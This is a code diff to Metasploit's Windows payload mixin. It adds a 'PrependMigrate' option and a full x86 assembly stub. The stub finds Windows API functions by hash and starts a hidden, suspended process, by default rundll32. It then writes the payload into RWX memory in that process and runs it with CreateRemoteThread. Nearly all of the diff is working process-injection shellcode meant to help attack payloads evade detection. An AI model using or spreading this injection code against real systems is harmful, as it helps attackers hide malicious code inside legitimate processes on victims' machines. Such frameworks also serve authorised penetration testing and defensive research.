@@ -26,7 +26,7 @@ module Msf::Payload::Windows
 	# This mixin is chained within payloads that target the Windows platform.
 	# It provides special variable substitution for things like EXITFUNC and
 	# automatically adds it as a required option for exploits that use windows
-	# payloads.
+	# payloads. It also provides the migrate prepend.
 	#
 	def initialize(info = {})
 		ret = super( info )
@@ -53,8 +53,216 @@ module Msf::Payload::Windows
 			[
 				Msf::OptRaw.new('EXITFUNC', [ true, "Exit technique: #{@@exit_types.keys.join(", ")}", 'process' ])
 			], Msf::Payload::Windows )
-
+		register_advanced_options(
+			[
+				Msf::OptBool.new('PrependMigrate', [ true, "Spawns and runs shellcode in new process", false ]),
+				Msf::OptString.new('PrependMigrateProc', [ false, "Process to spawn and run shellcode in" ])
+			], Msf::Payload::Windows )
 		ret
+	end
+
+	#
+	# Overload the generate() call to prefix our stubs
+	#
+	def generate(*args)
+		# Call the real generator to get the payload
+		buf = super(*args)
+		pre = ''
+
+		test_arch = [ *(self.arch) ]
+
+		# Handle all x86 code here
+		if (test_arch.include?(ARCH_X86))
+
+			# PrependMigrate
+			if (datastore['PrependMigrate'])
+				payloadsize = "0x%04x" % buf.length
+				procname = datastore['PrependMigrateProc'] || 'rundll32'
+
+				migrate_asm = <<EOS
+  cld                    ; Clear the direction flag.
+  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
+api_call:
+  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
+  mov ebp, esp           ; Create a new stack frame
+  xor edx, edx           ; Zero EDX
+  mov edx, [fs:edx+48]   ; Get a pointer to the PEB
+  mov edx, [edx+12]      ; Get PEB->Ldr
+  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
+next_mod:                ;
+  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
+  movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
+  xor edi, edi           ; Clear EDI which will store the hash of the module name
+loop_modname:            ;
+  xor eax, eax           ; Clear EAX
+  lodsb                  ; Read in the next byte of the name
+  cmp al, 'a'            ; Some versions of Windows use lower case module names
+  jl not_lowercase       ;
+  sub al, 0x20           ; If so normalise to uppercase
+not_lowercase:           ;
+  ror edi, 13            ; Rotate right our hash value
+  add edi, eax           ; Add the next byte of the name
+  loop loop_modname      ; Loop untill we have read enough
+  ; We now have the module hash computed
+  push edx               ; Save the current position in the module list for later
+  push edi               ; Save the current module hash for later
+  ; Proceed to itterate the export address table, 
+  mov edx, [edx+16]      ; Get this modules base address
+  mov eax, [edx+60]      ; Get PE header
+  add eax, edx           ; Add the modules base address
+  mov eax, [eax+120]     ; Get export tables RVA
+  test eax, eax          ; Test if no export address table is present
+  jz get_next_mod1       ; If no EAT present, process the next module
+  add eax, edx           ; Add the modules base address
+  push eax               ; Save the current modules EAT
+  mov ecx, [eax+24]      ; Get the number of function names  
+  mov ebx, [eax+32]      ; Get the rva of the function names
+  add ebx, edx           ; Add the modules base address
+  ; Computing the module hash + function hash
+get_next_func:           ;
+  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
+  dec ecx                ; Decrement the function name counter
+  mov esi, [ebx+ecx*4]   ; Get rva of next module name
+  add esi, edx           ; Add the modules base address
+  xor edi, edi           ; Clear EDI which will store the hash of the function name
+  ; And compare it to the one we want
+loop_funcname:           ;
+  xor eax, eax           ; Clear EAX
+  lodsb                  ; Read in the next byte of the ASCII function name
+  ror edi, 13            ; Rotate right our hash value
+  add edi, eax           ; Add the next byte of the name
+  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
+  jne loop_funcname      ; If we have not reached the null terminator, continue
+  add edi, [ebp-8]       ; Add the current module hash to the function hash
+  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
+  jnz get_next_func      ; Go compute the next function hash if we have not found it
+  ; If found, fix up stack, call the function and then value else compute the next one...
+  pop eax                ; Restore the current modules EAT
+  mov ebx, [eax+36]      ; Get the ordinal table rva      
+  add ebx, edx           ; Add the modules base address
+  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
+  mov ebx, [eax+28]      ; Get the function addresses table rva  
+  add ebx, edx           ; Add the modules base address
+  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
+  add eax, edx           ; Add the modules base address to get the functions actual VA
+  ; We now fix up the stack and perform the call to the desired function...
+finish:
+  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
+  pop ebx                ; Clear off the current modules hash
+  pop ebx                ; Clear off the current position in the module list
+  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
+  pop ecx                ; Pop off the origional return address our caller will have pushed
+  pop edx                ; Pop off the hash value our caller will have pushed
+  push ecx               ; Push back the correct return value
+  jmp eax                ; Jump into the required function
+  ; We now automagically return to the correct caller...
+get_next_mod:            ;
+  pop eax                ; Pop off the current (now the previous) modules EAT
+get_next_mod1:           ;
+  pop edi                ; Pop off the current (now the previous) modules hash
+  pop edx                ; Restore our position in the module list
+  mov edx, [edx]         ; Get the next module
+  jmp next_mod     ; Process this module
+;--------------------------------------------------------------------------------------
+start:                   ;
+  pop ebp                ; Pop off the address of 'api_call' for calling later.
+
+  ; get our own startupinfo at esp+0x60
+  add esp,-400                  ; adjust the stack to avoid corruption
+  mov edx,esp
+  add edx,0x60
+  push edx
+  push 0xB16B4AB1             ; hash( "kernel32.dll", "GetStartupInfoA" )
+  call ebp                    ; GetStartupInfoA( &si );
+
+  ; ptr to startupinfo is in eax
+  ; pointer to string is in ecx
+  jmp getcommand
+  gotcommand:
+  pop esi                       ; esi = address of process name (command line)
+
+  ; create the process
+  mov edi,eax
+  add edi,0x60                  ; Offset of empty space for lpProcessInformation
+  push edi                      ; lpProcessInformation : write processinfo here
+  push eax                      ; lpStartupInfo : current info (read)
+  xor ebx,ebx
+  push ebx                      ; lpCurrentDirectory
+  push ebx                      ; lpEnvironment
+  push 0x08000004               ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
+  push ebx                      ; bInHeritHandles
+  push ebx                      ; lpThreadAttributes
+  push ebx                      ; lpProcessAttributes
+  push esi                      ; lpCommandLine
+  push ebx                      ; lpApplicationName
+
+  push 0x863FCC79               ; hash( "kernel32.dll", "CreateProcessA" )
+  call ebp                      ; CreateProcessA( &si );
+
+  ; allocate memory in the process (VirtualAllocEx())
+  ; get handle
+  mov ecx,[edi]
+  push 0x40                     ; RWX
+  add bh,0x10                   ; ebx = 0x1000
+  push ebx                      ; MEM_COMMIT
+  push ebx                      ; size
+  xor ebx,ebx
+  push ebx                      ; address
+  push ecx                      ; handle
+  push 0x3F9287AE               ; hash( "kernel32.dll", "VirtualAllocEx" )
+  call ebp                      ; VirtualAllocEx( ...);
+
+  ; eax now contains the destination
+  ; WriteProcessMemory()
+  lea esi, [edi + 4]
+  push esi                      ; lpNumberOfBytesWritten 
+  push #{payloadsize}           ; nSize 
+  ; pick up pointer to shellcode & keep it on stack
+  jmp begin_of_payload
+  begin_of_payload_return:
+  pop edx
+  push edx                      ; lpBuffer 
+  push eax                      ; lpBaseAddress 
+  mov ecx,[edi]                 ; pick up handle again
+  push ecx                      ; hProcess 
+  push 0xE7BDD8C5               ; hash( "kernel32.dll", "WriteProcessMemory" )
+  call ebp                      ; WriteProcessMemory( ...);
+
+  ; run the code (CreateRemoteThread())
+  mov ecx,[edi]                 ; pick up handle again
+  xor ebx,ebx
+  push ebx                      ; lpthreadID
+  push ebx                      ; run immediately
+  push ebx                      ; no parameter
+  mov ebx,[esp-0x4]
+  push ebx                      ; shellcode
+  xor ebx,ebx
+  add bh,0x20
+  push ebx                      ; stacksize
+  xor ebx,ebx
+  push ebx                      ; lpThreadAttributes
+  push ecx
+  push 0x799AACC6               ; hash( "kernel32.dll", "CreateRemoteThread" )
+  call ebp                      ; CreateRemoteThread( ...);
+
+  ;sleep
+  push -1
+  push 0xE035F044               ; hash( "kernel32.dll", "Sleep" )
+  call ebp                      ; Sleep( ... );
+
+getcommand:
+  call gotcommand
+  db "#{procname}"
+  db 0x00
+begin_of_payload:
+  call begin_of_payload_return
+EOS
+
+				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
+			end
+		end
+
+		return (pre + buf)
 	end
 
 	#
